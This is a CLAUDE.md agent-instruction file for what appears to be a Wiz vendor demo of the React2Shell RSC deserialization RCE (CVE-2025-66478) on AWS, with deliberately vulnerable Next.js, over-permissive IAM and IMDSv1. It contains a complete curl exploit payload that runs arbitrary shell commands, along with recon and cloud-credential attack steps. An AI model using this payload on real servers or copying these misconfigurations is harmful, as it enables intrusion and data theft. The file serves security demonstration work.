# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with this codebase.

## Project Overview

This is a **Wiz security demo environment** showcasing the React Server Components RCE vulnerability (React2Shell, CVE-2025-66478). The demo runs on AWS EC2 with Terraform IaC.

### Demo Purpose

Demonstrates Wiz platform capabilities:
- **Wiz Code**: IDE & repo scanning for vulnerable packages and risky IaC
- **Wiz Cloud**: Agentless CNAPP-style discovery and graph visualization
- **Wiz Defend / Wiz Sensor**: Runtime detection of RCE behavior
- **Wiz CLI**: Code-to-cloud context and CI scanning

### Attack Path Narrative

```
Container:  Internet → EC2:3000 → Docker Container (RCE) → IMDS → IAM Role → S3
Native:     Internet → EC2:3001 → EC2 Host (RCE)        → IMDS → IAM Role → S3
```

## Repository Structure

```
app/nextjs/           # Vulnerable Next.js 16.0.6 application (React 19.2.0)
infra/aws/            # Terraform: VPC, EC2, S3, ECR, IAM
wizcli                # Wiz CLI binary
```

## Development Commands

### Next.js App (Local)

```bash
cd app/nextjs
npm install
npm run dev          # Start dev server at http://localhost:3000
npm run build        # Production build
npm run lint         # Run ESLint
```

### Docker Build

```bash
cd app/nextjs
docker build -t wiz-rsc-demo:latest .
docker run --rm -p 3000:3000 wiz-rsc-demo:latest
```

### Terraform (Infrastructure)

```bash
cd infra/aws
terraform init
terraform plan
terraform apply      # Outputs: app_url, ec2_public_ip, s3_bucket_name
terraform destroy
```

## Key Technical Details

### Vulnerable Versions (Intentional)

| Package | Version | Notes |
|---------|---------|-------|
| Next.js | 16.0.6 | CVE-2025-66478 - RSC deserialization RCE |
| React | 19.2.0 | Paired with vulnerable Next.js |

### Infrastructure Design

- **EC2 Instance**: Single instance with two deployment options:
  - **Container (port 3000)**: `~/start-demo.sh` - pulls from ECR, runs in Docker
  - **Native (port 3001)**: `~/start-native.sh` - clones repo, runs directly on EC2
- **Over-permissive IAM**: Instance profile has S3 read access (lateral movement path)
- **Public S3 bucket**: Contains fake sensitive data (`employees.json`, `roadmap_2025_confidential.txt`)
- **IMDSv1 enabled**: Allows credential theft from both container and native app

### App Routes

- `/` – Landing page (changes to "PWNED" when `/tmp/banner.json` exists)

### RCE Demo Capabilities

When exploited via CVE-2025-66478, the app allows:
1. Recon commands: `whoami`, `id`, `uname -a`, `cat /etc/passwd`
2. File writes: `/tmp/pwned.txt`, `/tmp/banner.json` (triggers UI change)
3. AWS access: `aws s3 ls`, `aws s3 cp` using instance IAM role

## Exploit Payload (CVE-2025-66478)

Use port 3000 for container, port 3001 for native.

```bash
curl -X POST http://<TARGET>:3000 \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="0"\r
\r
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\\"then\\\":\\\"$B1337\\\"}","_response":{"_prefix":"process.mainModule.require('"'"'child_process'"'"').execSync('"'"'YOUR_COMMAND_HERE'"'"');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="2"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
'
```

**Usage:** Replace `YOUR_COMMAND_HERE` with any shell command.

**Notes:**
- No Action ID needed - use `Next-Action: x` header
- Single quotes in commands need escaping: `'"'"'`
- Base64 encoding simplifies complex payloads

## Working Style Rules

1. **One major thing at a time** – Focus on the current task only
2. **Keep complexity low** – Prefer simple, readable Terraform
3. **No real secrets** – Use fake/demo data only
4. **Full-file outputs** – Show complete files, not diffs
5. **Be explicit about assumptions** – Document version choices
6. **Respect user pace** – Don't ask "Ready for the next step?" – wait for explicit requests

## Current State

- ✅ Next.js app scaffolded with vulnerable versions
- ✅ Docker build working (port 3000)
- ✅ Native EC2 deployment option (port 3001)
- ✅ Terraform for EC2 + S3 + IAM
- ✅ S3 bucket with fake sensitive data
- ✅ RCE exploit works (CVE-2025-66478)
- ✅ Wiz Sensor installed

## Security Warning

> **DO NOT DEPLOY TO PRODUCTION**
>
> This repository contains intentionally vulnerable code for security demonstration purposes only.
